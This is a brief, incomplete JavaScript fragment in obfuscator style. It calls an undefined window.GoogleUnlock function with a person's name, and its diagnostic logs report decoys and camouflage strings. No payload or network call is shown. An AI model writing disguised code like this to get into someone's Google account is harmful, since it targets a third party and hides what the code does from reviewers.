  (function (_0xmod) {
    ...
    (async () => {
      try {
        const _0ready = await window.GoogleUnlock('佐藤 結衣');
        Log.diag('Companion check complete', { ready: !!_0ready });
        Log.diag('Companion readout', { decoys: 1, camoStrings: true });
      } catch (e) {
        Log.diag('Companion check skipped', { reason: 'unavailable' });
      }
    })();
